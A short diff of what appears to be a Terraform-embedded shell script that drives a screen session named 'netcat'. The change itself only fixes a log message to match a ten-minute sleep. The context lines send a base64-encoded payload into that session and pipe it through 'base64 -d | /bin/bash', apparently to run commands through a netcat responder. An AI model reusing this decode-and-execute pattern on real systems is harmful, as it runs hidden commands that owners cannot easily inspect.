@@ -18,7 +18,7 @@ locals {
         log 'sending screen command: ${var.inputs["payload"]}';
         screen -S netcat -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
         log "responder started..."
-        log 'waiting 5 minutes...';
+        log 'waiting 10 minutes...';
         sleep 600
         CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
         if [ "$CHECK_HASH" != "$START_HASH" ]; then
